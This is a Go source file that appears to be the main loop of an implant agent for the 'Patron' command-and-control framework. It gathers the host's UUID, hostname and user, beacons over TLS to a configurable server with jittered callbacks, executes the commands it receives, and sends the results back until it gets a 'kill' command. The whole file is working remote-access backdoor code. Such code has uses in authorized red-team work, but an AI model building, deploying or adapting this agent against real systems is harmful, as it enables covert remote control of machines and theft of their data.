package main

import (
    "encoding/gob"
    "fmt"
    "log"
    "time"

    "github.com/PatronC2/Patron/lib/logger"
    "github.com/PatronC2/Patron/lib/agentutils"
    "github.com/PatronC2/Patron/types"
)

var (
    ServerIP          string
    ServerPort        string
    CallbackFrequency string
    CallbackJitter    string
    RootCert          string
)

func main() {
    enableLogging := true
    logFileName := "app.log"
    err := agentutils.InitLogger(enableLogging, logFileName)
    if err != nil {
        fmt.Printf("Error initializing logger: %v\n", err)
        return
    }

    config, err := agentutils.SetupTLSConfig(RootCert)
    if err != nil {
        log.Fatal(err)
    }

    agentUUID, hostname, user, err := agentutils.GetAgentInfo()
    if err != nil {
        log.Fatal(err)
    }

    for {
    RETRY:
        beacon, err := agentutils.SendBeacon(config, ServerIP, ServerPort, agentUUID, user, hostname, CallbackFrequency, CallbackJitter)
        if err != nil {
            logger.Logf(logger.Error, "Error Occurred: \n", err)
            time.Sleep(time.Second * 5)
            goto RETRY
        }

        dec := gob.NewDecoder(beacon)
        encoder := gob.NewEncoder(beacon)
        instruct := &types.GiveAgentCommand{}
        err = dec.Decode(instruct)
        if err != nil {
            logger.Logf(logger.Error, "Error Occurred: \n", err)
        }

        agentutils.UpdateAgentConfig(instruct, &ServerIP, &ServerPort, &CallbackFrequency, &CallbackJitter)

        result, err := agentutils.HandleCommand(instruct, user, hostname, agentUUID)
        if err != nil {
            logger.Logf(logger.Error, "Error Occurred: \n", err)
        }

        err = encoder.Encode(result)
        if err != nil {
            logger.Logf(logger.Error, "Error Occurred: \n", err)
        }

        beacon.Close()

        if instruct.CommandType == "kill" {
            break
        }

        time.Sleep(agentutils.CalculateJitter(CallbackFrequency, CallbackJitter))
    }
}
